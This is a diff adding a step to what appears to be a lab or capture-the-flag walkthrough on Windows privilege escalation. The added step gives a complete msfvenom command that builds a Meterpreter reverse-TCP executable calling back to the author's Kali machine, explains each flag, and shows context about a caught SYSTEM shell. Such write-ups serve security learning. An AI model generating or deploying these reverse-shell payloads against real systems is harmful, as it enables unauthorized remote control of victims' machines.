@@ -76,3 +76,20 @@ Metasploit caught SYSTEM shell on port 9001
                               ↓
 whoami → nt authority\system
 ```
+
+## Step 1 — Generating a Malicious Payload with msfvenom
+
+I used revshells.com to build the msfvenom command, then ran it on my Kali machine to generate a malicious executable.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o reverse.exe
+```
+
+### Flag Breakdown
+
+- -p windows/x64/meterpreter/reverse_tcp: Generates a 64-bit Windows Meterpreter reverse TCP payload.
+- LHOST=192.168.5.128: The IP address of my Kali machine that receives the reverse connection.
+- LPORT=4444: The port on my Kali machine that listens for the incoming Meterpreter session.
+- -f exe: Generates the payload as a Windows executable (.exe).
+- -o reverse.exe: Saves the generated payload as reverse.exe.
+
